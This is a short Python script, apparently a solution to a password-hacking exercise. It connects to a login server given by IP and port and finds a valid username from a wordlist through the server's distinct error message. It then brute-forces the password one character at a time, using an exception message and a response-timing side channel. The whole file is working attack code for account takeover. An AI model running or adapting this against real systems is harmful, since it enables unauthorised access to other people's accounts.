import sys
import socket
import itertools
import json
import time


ip, port = sys.argv[1:]

file = open("logins.txt", "r")
common_logins = file.readlines()
common_logins = [line.strip("\n") for line in common_logins]
password = ""
login = ""


with socket.socket() as client_socket:
    client_socket.connect((ip, int(port)))
    for login_attempt in common_logins:
        credentials = {"login": login_attempt, "password": " "}

        client_socket.send(json.dumps(credentials).encode())
        response = client_socket.recv(1024).decode()

        if json.loads(response)["result"] == "Wrong password!":
            login = login_attempt
            break

    while True:
        for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            credentials = {"login": login, "password": password + char}
            client_socket.send(json.dumps(credentials).encode())
            start = time.perf_counter()
            response = client_socket.recv(1024).decode()
            end = time.perf_counter()
            elapsed = end - start

            if json.loads(response)["result"] == "Exception happened during login" or elapsed > 0.1:
                password += char
                break

            elif json.loads(response)["result"] == "Connection success!":
                print(json.dumps(credentials))
                exit()

